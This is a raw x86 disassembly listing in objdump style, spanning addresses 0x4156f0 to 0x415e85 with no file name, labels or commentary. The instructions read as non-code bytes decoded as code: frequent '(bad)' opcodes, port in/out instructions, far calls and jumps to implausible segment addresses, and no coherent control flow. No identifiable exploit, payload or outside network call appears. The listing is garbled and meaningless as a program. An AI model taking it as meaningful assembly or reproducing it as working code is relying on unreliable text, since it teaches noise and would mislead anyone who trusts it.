  4156f0:	mov    al,0x84
  4156f2:	add    al,0x68
  4156f4:	mov    ds,WORD PTR [ebx-0x10]
  4156f7:	imul   esp,DWORD PTR [ebx],0x37
  4156fa:	or     dl,al
  4156fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156fd:	push   edi
  4156fe:	ja     0x415712
  415700:	jg     0x4156df
  415702:	push   esi
  415703:	test   al,0x46
  415705:	push   edx
  415706:	shl    ebx,cl
  415708:	jne    0x415709
  41570a:	sub    dh,BYTE PTR [edi-0x77c60254]
  415710:	jbe    0x41578a
  415712:	cmp    BYTE PTR [esi-0x2e1e0992],al
  415718:	in     ax,0x4e
  41571b:	into   
  41571c:	mov    ch,0xa9
  41571e:	sar    DWORD PTR [edi-0xc97a245],cl
  415724:	in     eax,0xac
  415726:	in     al,dx
  415727:	lods   eax,DWORD PTR ds:[esi]
  415728:	fisttp WORD PTR [edi-0x9]
  41572b:	and    al,0x41
  41572d:	test   DWORD PTR [edi-0x6d],edi
  415730:	test   DWORD PTR [ebx],0xc1646eff
  415736:	outs   dx,DWORD PTR ds:[esi]
  415737:	jg     0x41573b
  415739:	aas    
  41573a:	push   esp
  41573b:	jmp    0x4157a8
  41573d:	sub    DWORD PTR [esi+0x5b31a480],ebx
  415743:	jnp    0x415701
  415745:	and    edi,DWORD PTR [eax-0x6f638b51]
  41574b:	inc    esi
  41574c:	pop    edi
  41574d:	ret    
  41574e:	inc    eax
  41574f:	outs   dx,DWORD PTR ds:[esi]
  415750:	xor    DWORD PTR ds:0xa04dddf0,esp
  415756:	out    dx,eax
  415757:	je     0x41577c
  415759:	jb     0x415713
  41575b:	mov    al,ds:0x4858622c
  415760:	cmp    bh,BYTE PTR [esi+0x3d]
  415763:	sahf   
  415764:	xchg   ecx,eax
  415765:	imul   esi,DWORD PTR [eax],0x4a
  415768:	neg    BYTE PTR [ecx]
  41576a:	dec    edi
  41576b:	sbb    BYTE PTR [ecx+eax*4],0x3c
  41576f:	pop    edi
  415770:	sahf   
  415771:	jg     0x415780
  415773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415774:	clc    
  415775:	mov    al,BYTE PTR [esi+0x13967cea]
  41577b:	cmp    esp,DWORD PTR [ebx-0x5d]
  41577e:	stos   DWORD PTR es:[edi],eax
  41577f:	fbld   TBYTE PTR [edx+0x13]
  415782:	lock or dh,BYTE PTR [esi+ebx*1]
  415786:	jae    0x4157fd
  415788:	sti    
  415789:	xor    ch,BYTE PTR [esi+eiz*2]
  41578c:	inc    esp
  41578d:	(bad)  
  41578e:	cmc    
  41578f:	jg     0x415766
  415791:	add    bl,BYTE PTR [eax]
  415793:	test   al,0x1d
  415795:	fbstp  TBYTE PTR [eax]
  415797:	add    DWORD PTR [edx+edi*8-0x7536c99f],edi
  41579e:	in     eax,dx
  41579f:	sub    cl,BYTE PTR [ebx-0x6d844fed]
  4157a5:	and    edx,ebx
  4157a7:	jecxz  0x4157c3
  4157a9:	bound  esp,QWORD PTR [eax+ebp*4-0x67708102]
  4157b0:	xchg   esi,eax
  4157b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157b2:	xchg   edi,eax
  4157b3:	lfs    esi,FWORD PTR [ebx+0x24]
  4157b7:	les    edi,FWORD PTR ds:0xdad4342d
  4157bd:	test   DWORD PTR [esi-0x5b],edi
  4157c0:	mov    esp,0x336f1625
  4157c5:	int    0xe4
  4157c7:	mov    cl,BYTE PTR [edx-0x16]
  4157ca:	mov    al,BYTE PTR [esi+0x1]
  4157cd:	int    0x9b
  4157cf:	test   eax,0x7efe7d8b
  4157d4:	mov    esp,0xc19e1686
  4157d9:	sub    eax,0xc43f102d
  4157de:	fimul  WORD PTR [ecx-0x73]
  4157e1:	aam    0xde
  4157e3:	je     0x415788
  4157e5:	fbstp  TBYTE PTR [ebp+eiz*2+0x44bd8484]
  4157ec:	ins    BYTE PTR es:[edi],dx
  4157ed:	xchg   ebp,eax
  4157ee:	ja     0x415864
  4157f0:	sub    al,0xe3
  4157f2:	jp     0x415863
  4157f4:	push   ds
  4157f5:	jl     0x41581b
  4157f7:	into   
  4157f8:	push   ds
  4157f9:	and    al,0xb3
  4157fb:	sbb    eax,0xa0ad60ce
  415800:	rcr    BYTE PTR [esi],0x40
  415803:	mov    bl,0x32
  415805:	cmp    ecx,DWORD PTR [edi-0x6f5e8623]
  41580b:	fdiv   DWORD PTR [edx-0x7cba0984]
  415811:	adc    eax,DWORD PTR [ebp-0x27]
  415814:	jp     0x4157a5
  415816:	nop
  415817:	pop    ebx
  415818:	xchg   esi,eax
  415819:	in     al,dx
  41581a:	bound  edi,QWORD PTR [esi-0x25f6759b]
  415820:	mov    WORD PTR [edi],gs
  415822:	ficom  DWORD PTR [ebx]
  415824:	rcl    edx,cl
  415826:	xor    al,0x35
  415828:	das    
  415829:	cdq    
  41582a:	sub    DWORD PTR [ebp+0x5becef21],edi
  415830:	pop    ecx
  415831:	and    al,BYTE PTR [eax]
  415833:	sub    al,0x9e
  415835:	jge    0x4157c7
  415837:	dec    esi
  415838:	cdq    
  415839:	adc    ebx,DWORD PTR [eax+0x44]
  41583c:	jmp    0x4157df
  41583e:	lds    eax,FWORD PTR [ebp+eax*8-0x4c]
  415842:	fld    TBYTE PTR [ebp+eiz*4-0x39]
  415846:	inc    ebp
  415847:	xor    esp,ecx
  415849:	or     BYTE PTR [esi],al
  41584b:	dec    DWORD PTR [ebp+0x47]
  41584e:	frstor [esi-0x5b4fce19]
  415854:	out    dx,al
  415855:	push   ebx
  415856:	xchg   edi,eax
  415857:	xor    DWORD PTR [ebx+0x72],0x6a
  41585b:	or     ebp,0x74
  41585e:	sbb    eax,DWORD PTR [eax+0x47]
  415861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415862:	popf   
  415863:	or     al,0xd3
  415865:	into   
  415866:	lock rcl DWORD PTR [eax+0x40],1
  41586a:	jae    0x4157fc
  41586c:	jb     0x415830
  41586e:	out    0x50,al
  415870:	jge    0x41585e
  415872:	in     al,dx
  415873:	push   edx
  415874:	xor    ch,dl
  415876:	ret    0xc59c
  415879:	mov    ds:0xc88889f2,eax
  41587e:	add    ecx,eax
  415880:	adc    eax,0x82bf4687
  415885:	in     eax,dx
  415886:	int    0xfe
  415888:	mov    ch,0x42
  41588a:	pop    ecx
  41588b:	enter  0xdf90,0x48
  41588f:	mov    ah,0xeb
  415891:	pop    DWORD PTR [eax]
  415893:	mov    eax,ds:0xa3f682d0
  415898:	pop    ds
  415899:	dec    esi
  41589a:	add    al,ch
  41589c:	ja     0x4158f1
  41589e:	mov    edx,0x3ef1d1f2
  4158a3:	adc    al,BYTE PTR [ecx]
  4158a5:	fadd   DWORD PTR [ebp-0x295c613e]
  4158ab:	out    dx,al
  4158ac:	(bad)  
  4158ad:	call   0xc043:0xb0dbd0aa
  4158b4:	outs   dx,DWORD PTR ds:[esi]
  4158b5:	adc    ebx,DWORD PTR [esi]
  4158b7:	or     al,0xd6
  4158b9:	push   cs
  4158ba:	daa    
  4158bb:	pop    ds
  4158bc:	mov    dh,BYTE PTR [edi+0x7836283]
  4158c2:	jge    0x4158e1
  4158c4:	inc    edi
  4158c5:	add    DWORD PTR [ecx],ecx
  4158c7:	int    0x47
  4158c9:	add    bl,dh
  4158cb:	clc    
  4158cc:	iret   
  4158cd:	(bad)  
  4158ce:	stos   BYTE PTR es:[edi],al
  4158cf:	out    0x6,eax
  4158d1:	shl    ebx,0x87
  4158d4:	js     0x4158c1
  4158d6:	cdq    
  4158d7:	mov    WORD PTR [ecx+0x19],es
  4158da:	call   0x9230:0xb0b32053
  4158e1:	dec    ebx
  4158e2:	push   edx
  4158e3:	js     0x415961
  4158e5:	dec    eax
  4158e6:	push   edi
  4158e7:	gs jnp 0x415949
  4158ea:	jo     0x41593f
  4158ec:	mov    esp,0x2b62c544
  4158f1:	sbb    esp,DWORD PTR [ebx-0x6a30a65d]
  4158f7:	and    eax,0xc9d71786
  4158fc:	sub    ch,0x94
  4158ff:	lds    ebp,FWORD PTR [esi+edi*2-0x5d]
  415903:	cld    
  415904:	mov    esp,0x58693154
  415909:	xor    al,0xa5
  41590b:	jge    0x415968
  41590d:	enter  0x889,0x10
  415911:	or     al,0xc
  415913:	dec    eax
  415914:	loop   0x415930
  415916:	retf   0x7111
  415919:	mov    gs,WORD PTR [eax-0x75]
  41591c:	and    ah,BYTE PTR [edi-0x12b55fc7]
  415922:	outs   dx,DWORD PTR ds:[esi]
  415923:	adc    DWORD PTR [edx-0x41729c58],esi
  415929:	cdq    
  41592a:	dec    edx
  41592b:	out    0x33,eax
  41592d:	xor    al,0x84
  41592f:	sbb    bl,BYTE PTR [ebp-0x2a]
  415932:	out    0x75,al
  415934:	push   eax
  415935:	js     0x4158e5
  415937:	and    bl,al
  415939:	out    0x6f,al
  41593b:	repnz mov WORD PTR [esi],?
  41593e:	add    eax,DWORD PTR [esi-0x5c786183]
  415944:	aaa    
  415945:	(bad)  
  415946:	adc    esp,DWORD PTR [edx]
  415948:	mov    ds,WORD PTR ds:0xa2aa2f4
  41594e:	pop    ecx
  41594f:	cdq    
  415950:	sub    DWORD PTR [ebx-0x698de1fe],ecx
  415956:	sbb    edx,DWORD PTR [edx+esi*1]
  415959:	add    BYTE PTR [edx],0x24
  41595c:	or     BYTE PTR [ebx],0x31
  41595f:	ret    0x508
  415962:	out    dx,al
  415963:	and    ebx,ebp
  415965:	cmp    BYTE PTR [ebx],ch
  415967:	ffreep st(0)
  415969:	inc    edx
  41596a:	jmp    0x730e:0x767b9b63
  415971:	adc    al,0x51
  415973:	push   edx
  415974:	in     eax,0x84
  415976:	push   esp
  415977:	ja     0x41595c
  415979:	sub    al,0x52
  41597b:	call   FWORD PTR [esi+0x63]
  41597e:	jnp    0x4159d1
  415980:	sub    edi,edi
  415982:	adc    DWORD PTR [edx+0x386ce25a],ecx
  415988:	scas   eax,DWORD PTR es:[edi]
  415989:	cmp    cl,BYTE PTR fs:[edx+0x6]
  41598d:	ja     0x4159cf
  41598f:	cmp    ecx,ebp
  415991:	cmp    DWORD PTR [ebx+0x475472b8],ecx
  415997:	pop    esp
  415998:	in     eax,dx
  415999:	loopne 0x415925
  41599b:	lahf   
  41599c:	sbb    al,0x71
  41599e:	in     al,dx
  41599f:	mov    ds:0xe14f39d3,eax
  4159a4:	test   al,0xe5
  4159a6:	cmp    DWORD PTR [esi-0x531b6a4f],edx
  4159ac:	loopne 0x4159f5
  4159ae:	mov    cl,0x7b
  4159b0:	pop    edi
  4159b1:	aas    
  4159b2:	xchg   esi,eax
  4159b3:	sbb    eax,0x24a8be3a
  4159b8:	fsubr  QWORD PTR [esi+0xb]
  4159bb:	or     bl,dl
  4159bd:	div    BYTE PTR [ebx]
  4159bf:	add    al,BYTE PTR [edx]
  4159c1:	dec    ebx
  4159c2:	xchg   ebp,eax
  4159c3:	cmp    bl,BYTE PTR [eax+0x19]
  4159c6:	fwait
  4159c7:	mov    ecx,0x746951dd
  4159cc:	sahf   
  4159cd:	xchg   edx,eax
  4159ce:	repnz (bad) 
  4159d0:	out    dx,eax
  4159d1:	push   esi
  4159d2:	mov    BYTE PTR [eax+0x5fcdf74f],ch
  4159d8:	les    eax,FWORD PTR [eax+ecx*8]
  4159db:	inc    esi
  4159dc:	mov    al,ds:0xc2dba120
  4159e1:	xchg   esp,eax
  4159e2:	iret   
  4159e3:	xor    cl,ch
  4159e5:	pop    ecx
  4159e6:	jmp    0xbb32:0x121eee55
  4159ed:	stc    
  4159ee:	addr16 out 0xf2,al
  4159f1:	addr16 mov ds:0x6d9b,eax
  4159f5:	xchg   ebx,eax
  4159f6:	mov    esp,0x71a91e4b
  4159fb:	shr    BYTE PTR [ecx+0x7b],0x26
  4159ff:	aad    0xe3
  415a01:	mov    esi,0x8134d771
  415a06:	or     BYTE PTR ds:0xe172b116,ch
  415a0c:	cmp    DWORD PTR [ecx+0x62],0x19
  415a10:	les    ebx,FWORD PTR [edi+0x2b]
  415a13:	push   esp
  415a14:	lahf   
  415a15:	push   esp
  415a16:	jb     0x4159af
  415a18:	sub    ebx,DWORD PTR [esi-0x31]
  415a1b:	sbb    eax,0x37c1f0bf
  415a20:	add    esp,esi
  415a22:	pop    ecx
  415a23:	daa    
  415a24:	push   edi
  415a25:	sbb    BYTE PTR [eax+0x7c],ch
  415a28:	retf   
  415a29:	push   es
  415a2a:	clc    
  415a2b:	repz xchg esp,eax
  415a2d:	inc    esp
  415a2e:	and    al,0xc5
  415a30:	pop    es
  415a31:	push   edx
  415a32:	fbld   TBYTE PTR [edi]
  415a34:	push   edx
  415a35:	std    
  415a36:	inc    edx
  415a37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a38:	ror    DWORD PTR [edi+0x16],0x8e
  415a3c:	dec    ebp
  415a3d:	ds mov ebx,0x6627a407
  415a43:	sbb    ecx,ebp
  415a45:	add    eax,0xddd5af2
  415a4a:	and    edi,DWORD PTR [esi-0x6a]
  415a4d:	dec    ebp
  415a4e:	xor    edx,DWORD PTR [edi]
  415a50:	adc    DWORD PTR [eax-0x1cffd224],ecx
  415a56:	loopne 0x415a5a
  415a58:	loope  0x415aae
  415a5a:	lea    esi,[ebx-0x31e7b259]
  415a60:	aas    
  415a61:	mov    WORD PTR [esi+esi*4+0x517d7e27],?
  415a68:	dec    edx
  415a69:	mov    bl,0xe7
  415a6b:	repnz mov eax,0xf04ab97
  415a71:	stos   BYTE PTR es:[edi],al
  415a72:	or     eax,0xc3deeae6
  415a77:	ret    0xd63
  415a7a:	lds    edx,FWORD PTR [eax+esi*8]
  415a7d:	fwait
  415a7e:	push   0x77
  415a80:	mov    fs,WORD PTR [esi+0x12]
  415a83:	jp     0x415ac1
  415a85:	and    eax,0x9bf0d46a
  415a8a:	sti    
  415a8b:	pop    ebp
  415a8c:	inc    esi
  415a8d:	cmp    bl,BYTE PTR cs:[ebx]
  415a90:	jp     0x415ac6
  415a92:	sbb    cl,BYTE PTR [edx-0x5a]
  415a95:	sub    eax,0x7c250ef6
  415a9a:	add    al,0xdd
  415a9c:	sbb    edi,eax
  415a9e:	imul   ebx,DWORD PTR [edi+0x3c3575c7],0xffffffe5
  415aa5:	xor    ch,BYTE PTR [ecx]
  415aa7:	and    ah,BYTE PTR [ebx+0x5e]
  415aaa:	sub    esp,DWORD PTR [eax-0x73]
  415aad:	adc    al,0xe7
  415aaf:	outs   dx,BYTE PTR ds:[esi]
  415ab0:	pop    edx
  415ab1:	outs   dx,DWORD PTR ds:[esi]
  415ab2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ab3:	fs jg  0x415af5
  415ab6:	ret    0xb101
  415ab9:	dec    edx
  415aba:	cmp    ch,cl
  415abc:	ds in  eax,dx
  415abe:	dec    ebx
  415abf:	fwait
  415ac0:	pop    esp
  415ac1:	dec    ebp
  415ac2:	retf   0x87ad
  415ac5:	repz jp 0x415abe
  415ac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ac9:	adc    al,0x72
  415acb:	xor    al,0x46
  415acd:	pop    ecx
  415ace:	jno    0x415b4f
  415ad0:	add    al,0xa0
  415ad2:	shl    DWORD PTR [esi],cl
  415ad4:	cs jo  0x415aad
  415ad7:	sbb    ebp,DWORD PTR [eax-0x37d2af55]
  415add:	mov    ch,0x1a
  415adf:	ja     0x415a69
  415ae1:	cmc    
  415ae2:	xchg   ebx,eax
  415ae3:	hlt    
  415ae4:	push   cs
  415ae5:	xchg   DWORD PTR [edi+ebp*8],esp
  415ae8:	fst    DWORD PTR [ebx-0x11]
  415aeb:	push   ds
  415aec:	mov    ebx,0x20842874
  415af1:	std    
  415af2:	mov    ds:0xc238851a,al
  415af7:	scas   eax,DWORD PTR es:[edi]
  415af8:	mov    eax,0x97ff4523
  415afd:	leave  
  415afe:	(bad)  
  415aff:	aam    0x91
  415b01:	je     0x415aea
  415b03:	pop    esp
  415b04:	stos   BYTE PTR es:[edi],al
  415b05:	push   eax
  415b06:	xor    bh,BYTE PTR [esi]
  415b08:	xor    esp,edi
  415b0a:	and    DWORD PTR [ebx-0x3ecfce11],esp
  415b10:	jbe    0x415b25
  415b12:	pop    ecx
  415b13:	(bad)  
  415b14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415b15:	add    BYTE PTR [edx+esi*1-0x2cbb16db],dl
  415b1c:	jg     0x415b26
  415b1e:	enter  0x9447,0x4e
  415b22:	lahf   
  415b23:	dec    eax
  415b24:	shl    BYTE PTR ds:0x3666b82c,0xcc
  415b2b:	pop    eax
  415b2c:	enter  0xec6b,0xf1
  415b30:	jnp    0x415b85
  415b32:	and    ecx,0x31451393
  415b38:	aas    
  415b39:	loope  0x415af8
  415b3b:	not    edi
  415b3d:	(bad)  [ecx+0x2e]
  415b40:	sub    bl,0xb4
  415b43:	sub    al,0x7f
  415b45:	add    al,0x0
  415b47:	repz inc ebp
  415b49:	imul   edi
  415b4b:	rol    BYTE PTR [ecx],1
  415b4d:	stc    
  415b4e:	rep ins BYTE PTR es:[edi],dx
  415b50:	sar    BYTE PTR [ebp-0xb],1
  415b53:	jno    0x415ba0
  415b55:	adc    ecx,eax
  415b57:	inc    esi
  415b58:	mov    ah,0x94
  415b5a:	add    eax,0x6b4bd34f
  415b5f:	(bad)  [edi+0x2f0fe011]
  415b65:	jb     0x415bdb
  415b67:	and    bh,BYTE PTR ds:0x57323ca9
  415b6d:	loop   0x415b4e
  415b6f:	stos   DWORD PTR es:[edi],eax
  415b70:	pusha  
  415b71:	in     al,0x70
  415b73:	sbb    eax,0x59642931
  415b78:	in     al,dx
  415b79:	ss pop ecx
  415b7b:	cmc    
  415b7c:	(bad)  
  415b7d:	pop    eax
  415b7e:	ret    
  415b7f:	sbb    BYTE PTR [ebx+0x16],0x2
  415b83:	pushf  
  415b84:	loop   0x415b29
  415b86:	gs dec esp
  415b88:	xor    eax,0x7619a666
  415b8d:	cmp    eax,0xea25e8fa
  415b92:	mov    BYTE PTR [eax+ebp*1],dh
  415b95:	out    0xb9,eax
  415b97:	addr16 xchg edi,eax
  415b99:	mov    ebp,0x1e12c83a
  415b9e:	sahf   
  415b9f:	cmp    DWORD PTR [eiz*2-0x665b4d58],0x52c42ca5
  415baa:	mov    esp,0x55caff05
  415baf:	loopne 0x415b4b
  415bb1:	fcmove st,st(2)
  415bb3:	push   ds
  415bb4:	fbld   TBYTE PTR [ebx+0x1e]
  415bb7:	push   ebp
  415bb8:	jecxz  0x415bf5
  415bba:	and    DWORD PTR [ecx-0x6a4d8da9],esi
  415bc0:	ins    BYTE PTR es:[edi],dx
  415bc1:	sar    ah,1
  415bc3:	sbb    ebp,DWORD PTR [eax]
  415bc5:	or     BYTE PTR ss:[bp+si+0x43],0x97
  415bcb:	adc    al,dh
  415bcd:	(bad)  
  415bce:	in     eax,dx
  415bcf:	ret    
  415bd0:	xchg   ebx,eax
  415bd1:	stc    
  415bd2:	pusha  
  415bd3:	dec    ecx
  415bd4:	mov    edi,0x9d043ad6
  415bd9:	xchg   ebx,eax
  415bda:	fwait
  415bdb:	js     0x415ba7
  415bdd:	xor    DWORD PTR [ebx+0x74],0xffffff9d
  415be1:	shr    BYTE PTR [eax-0x2f],1
  415be4:	and    BYTE PTR [ebx-0x14],0xe7
  415be8:	and    bh,ch
  415bea:	xor    ebx,DWORD PTR [edx+edi*8+0x5]
  415bee:	(bad)  
  415bf0:	or     bl,BYTE PTR [ecx-0x43a96345]
  415bf6:	in     al,0x53
  415bf8:	stc    
  415bf9:	jl     0x415c4e
  415bfb:	test   eax,0x6e08045f
  415c00:	mov    ebx,0xe0ec0722
  415c05:	inc    eax
  415c06:	xchg   BYTE PTR [edx],bl
  415c08:	mov    cl,0x6d
  415c0a:	jmp    0x2a998f80
  415c0f:	and    al,0x15
  415c11:	add    esi,DWORD PTR [edi+0x286c9625]
  415c17:	xor    ecx,edi
  415c19:	inc    esp
  415c1a:	addr16 (bad) 
  415c1c:	jecxz  0x415c97
  415c1e:	stos   DWORD PTR es:[edi],eax
  415c1f:	xchg   ebp,eax
  415c20:	inc    edx
  415c21:	dec    edi
  415c22:	ins    BYTE PTR es:[edi],dx
  415c23:	xor    dl,BYTE PTR [eax+0xd]
  415c26:	enter  0xd0,0xc
  415c2a:	stos   DWORD PTR es:[edi],eax
  415c2b:	pop    ecx
  415c2c:	std    
  415c2d:	adc    esp,ebp
  415c2f:	mov    es,esp
  415c31:	int    0x2d
  415c33:	jb     0x415c4c
  415c35:	sti    
  415c36:	mov    ah,0xfc
  415c38:	(bad)  
  415c39:	mov    al,ds:0x7f2ff29b
  415c3e:	mov    edi,0xa94a742c
  415c43:	xchg   ecx,eax
  415c44:	outs   dx,BYTE PTR ds:[esi]
  415c45:	cmp    al,0x64
  415c47:	stc    
  415c48:	and    ch,0x6
  415c4b:	and    BYTE PTR [ecx+0x69],cl
  415c4e:	shr    edx,1
  415c50:	leave  
  415c51:	push   ecx
  415c52:	sbb    DWORD PTR [ecx-0x42],0x0
  415c56:	or     BYTE PTR [esi+0x78],al
  415c59:	aaa    
  415c5a:	adc    eax,0x8f0eaf2a
  415c5f:	and    BYTE PTR [edx-0x1c],cl
  415c62:	mov    al,0xd2
  415c64:	add    BYTE PTR [ecx],bl
  415c66:	in     eax,0x48
  415c68:	out    0x31,eax
  415c6a:	out    dx,al
  415c6b:	(bad)  
  415c6c:	and    eax,0x2ceb8735
  415c71:	mov    ch,0x18
  415c73:	rol    cl,0xa1
  415c76:	fistp  QWORD PTR [edi-0x5fcad8b6]
  415c7c:	mov    eax,0xc84978df
  415c81:	xchg   ebx,eax
  415c82:	pushf  
  415c83:	inc    edx
  415c84:	push   es
  415c85:	mov    edx,0x7de3cfb1
  415c8a:	test   al,0x62
  415c8c:	je     0x415cdc
  415c8e:	jecxz  0x415c35
  415c90:	add    al,0x5e
  415c92:	jmp    0x415d07
  415c94:	int    0xb4
  415c96:	mov    esp,DWORD PTR [esi-0x6c]
  415c99:	shl    BYTE PTR [ebx-0x6fb206a6],0x73
  415ca0:	jp     0x415c4e
  415ca2:	mov    ds:0xfc803e1,al
  415ca7:	pop    ds
  415ca8:	mov    BYTE PTR [ecx+0x5],dl
  415cab:	test   DWORD PTR [edx],ebx
  415cad:	stos   BYTE PTR es:[edi],al
  415cae:	jmp    0xa1fac861
  415cb3:	jle    0x415cf1
  415cb5:	dec    ebp
  415cb6:	jb     0x415cd8
  415cb8:	je     0x415c8f
  415cba:	adc    DWORD PTR [esi+0x3d],eax
  415cbd:	daa    
  415cbe:	rcl    BYTE PTR [eax],1
  415cc0:	xor    ebp,ecx
  415cc2:	jae    0x415cfe
  415cc4:	jle    0x415cad
  415cc6:	jae    0x415cb1
  415cc8:	das    
  415cc9:	add    dh,ah
  415ccb:	je     0x415d10
  415ccd:	ins    DWORD PTR es:[edi],dx
  415cce:	nop
  415ccf:	xchg   esp,eax
  415cd0:	stos   DWORD PTR es:[edi],eax
  415cd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415cd2:	loop   0x415d2f
  415cd4:	ss dec ebp
  415cd6:	ror    BYTE PTR [eax+0x13],cl
  415cd9:	arpl   WORD PTR [ecx+0x6],dx
  415cdc:	(bad)  
  415cdd:	(bad)  
  415cde:	jo     0x415c6a
  415ce0:	ins    DWORD PTR es:[edi],dx
  415ce1:	xor    eax,0x432bf572
  415ce6:	dec    edx
  415ce7:	push   cs
  415ce8:	xor    DWORD PTR [ebx+0x47],0x97e409dc
  415cef:	fdiv   QWORD PTR [esi+edi*8+0x68ea1818]
  415cf6:	sti    
  415cf7:	jp     0x415ca1
  415cf9:	mov    eax,0x6c0ef7cb
  415cfe:	push   ecx
  415cff:	pop    edx
  415d00:	cs ss test eax,0x157e00d2
  415d07:	jne    0x415d4f
  415d09:	push   0xfffffff6
  415d0b:	xchg   edx,eax
  415d0c:	sbb    ch,0x69
  415d0f:	push   edi
  415d10:	xchg   ebp,eax
  415d11:	cmp    DWORD PTR [ecx],eax
  415d13:	push   esi
  415d14:	imul   ecx,DWORD PTR [ebx],0xe
  415d17:	lahf   
  415d18:	jns    0x415d79
  415d1a:	aaa    
  415d1b:	mov    ch,0x61
  415d1d:	in     al,0x7f
  415d1f:	xlat   BYTE PTR ds:[ebx]
  415d20:	dec    edi
  415d21:	int    0xff
  415d23:	jl     0x415cfe
  415d25:	lods   eax,DWORD PTR ds:[esi]
  415d26:	cs test eax,0x2c4db612
  415d2c:	dec    esi
  415d2d:	jo     0x415d3d
  415d2f:	lock sub edx,DWORD PTR [ecx+edx*8-0x57d61b18]
  415d37:	std    
  415d38:	lds    esp,FWORD PTR [eax-0x69]
  415d3b:	push   eax
  415d3c:	pop    ebx
  415d3d:	push   edi
  415d3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d3f:	shr    ah,0x8d
  415d42:	jne    0x415ce9
  415d44:	arpl   WORD PTR [ecx-0x63],di
  415d47:	dec    esp
  415d48:	adc    edi,ecx
  415d4a:	sbb    ch,BYTE PTR [edi+0x3]
  415d4d:	cmp    BYTE PTR [ebp+0x2eeb98bc],dl
  415d53:	push   ss
  415d54:	aas    
  415d55:	fsubr  st(0),st
  415d57:	pop    ds
  415d58:	in     eax,dx
  415d59:	mov    ds:0xa7fd283c,al
  415d5e:	mov    ebx,0x3140ac2d
  415d63:	fs mov edx,0x60e4de8e
  415d69:	dec    ebp
  415d6a:	enter  0xe0be,0xe1
  415d6e:	sub    BYTE PTR [eax],bh
  415d70:	adc    eax,0xc34f1a50
  415d75:	scas   al,BYTE PTR es:[edi]
  415d76:	fsubr  DWORD PTR [ebx]
  415d78:	addr16 (bad) 
  415d7a:	out    dx,eax
  415d7b:	jo     0x415d4c
  415d7d:	inc    eax
  415d7e:	(bad)  
  415d7f:	cdq    
  415d80:	xlat   BYTE PTR ds:[ebx]
  415d81:	jnp    0x415d8f
  415d83:	xchg   ebx,eax
  415d84:	jo     0x415d25
  415d86:	clc    
  415d87:	rcl    BYTE PTR [ebx-0x48],1
  415d8a:	push   esp
  415d8b:	call   0x2273:0x751b5700
  415d92:	ss (bad) 
  415d94:	call   DWORD PTR [edi]
  415d96:	loope  0x415df6
  415d98:	mov    DWORD PTR [edi-0x5],ecx
  415d9b:	fmul   DWORD PTR [ebx-0x34]
  415d9e:	and    al,0xd6
  415da0:	bound  edx,QWORD PTR [ebp+edi*8-0xe4c6f01]
  415da7:	pop    esp
  415da8:	loope  0x415dbf
  415daa:	jb     0x415d40
  415dac:	fisttp WORD PTR [ebx+0x7e86683e]
  415db2:	dec    edx
  415db3:	push   eax
  415db4:	lods   al,BYTE PTR ds:[esi]
  415db5:	cmp    eax,0xb317fe83
  415dba:	loope  0x415dcb
  415dbc:	mov    dl,0x1
  415dbe:	mov    cl,BYTE PTR ds:0x377e2707
  415dc4:	jnp    0x415d71
  415dc6:	(bad)  
  415dc7:	cli    
  415dc8:	fnclex 
  415dca:	and    esp,ecx
  415dcc:	inc    esp
  415dcd:	call   0xecd3:0xc896ef96
  415dd4:	jecxz  0x415dc8
  415dd6:	jmp    0x348c1ab1
  415ddb:	pop    ebx
  415ddc:	sbb    al,0x36
  415dde:	pop    esp
  415ddf:	cmc    
  415de0:	in     al,dx
  415de1:	lods   al,BYTE PTR ds:[esi]
  415de2:	pusha  
  415de3:	fldcw  WORD PTR [edx+0xe]
  415de6:	mov    esp,DWORD PTR [esi+0x549b2c0b]
  415dec:	pop    esi
  415ded:	mov    al,0x7d
  415def:	inc    esi
  415df0:	es add al,0xe4
  415df3:	cwde   
  415df4:	std    
  415df5:	out    dx,al
  415df6:	(bad)  
  415df7:	(bad)  
  415df8:	mov    dh,0xc6
  415dfa:	dec    eax
  415dfb:	aad    0x43
  415dfd:	cmp    BYTE PTR [ecx+edx*2-0x6c],ah
  415e01:	mov    BYTE PTR [ebx],al
  415e03:	mov    ds:0x66b02255,al
  415e08:	lds    ebp,FWORD PTR [edi]
  415e0a:	nop
  415e0b:	mov    ah,0xf7
  415e0d:	xchg   ecx,eax
  415e0e:	mov    DWORD PTR [edi+0x79],ebp
  415e11:	jnp    0x415e8e
  415e13:	and    bh,al
  415e15:	mov    ebp,0x5989372a
  415e1a:	test   ecx,ebx
  415e1c:	pop    edi
  415e1d:	rcr    ecx,0x4f
  415e20:	scas   eax,DWORD PTR es:[edi]
  415e21:	or     BYTE PTR [edi],dh
  415e23:	std    
  415e24:	call   0x634e:0x8bd12e4e
  415e2b:	int3   
  415e2c:	int3   
  415e2d:	sbb    ebp,ebp
  415e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e30:	ret    0x7723
  415e33:	pop    esi
  415e34:	push   0xffffffa9
  415e36:	(bad)  [ebx-0x51d1b201]
  415e3c:	rcl    ch,cl
  415e3e:	ds sub eax,0x896e8266
  415e44:	push   edi
  415e45:	xchg   esi,eax
  415e46:	or     BYTE PTR [edx],ch
  415e48:	popa   
  415e49:	push   0x17
  415e4b:	adc    esp,DWORD PTR ds:0x8a11df41
  415e51:	leave  
  415e52:	xchg   esp,ecx
  415e54:	test   DWORD PTR [eax-0x292cacd1],ebp
  415e5a:	mov    eax,0xe46d0d97
  415e5f:	xor    edi,ebx
  415e61:	into   
  415e62:	lods   eax,DWORD PTR ds:[esi]
  415e63:	jle    0x415ecb
  415e65:	jns    0x415e13
  415e67:	dec    esp
  415e68:	jmp    0x6d94b0ef
  415e6d:	lea    esp,[edx+0xb71a433]
  415e73:	or     eax,0x4ee96bff
  415e78:	ffreep st(5)
  415e7a:	in     al,0x31
  415e7c:	xchg   ebp,eax
  415e7d:	loopne 0x415e88
  415e7f:	imul   esp,ebx,0x6f65b50c
  415e85:	(bad)  
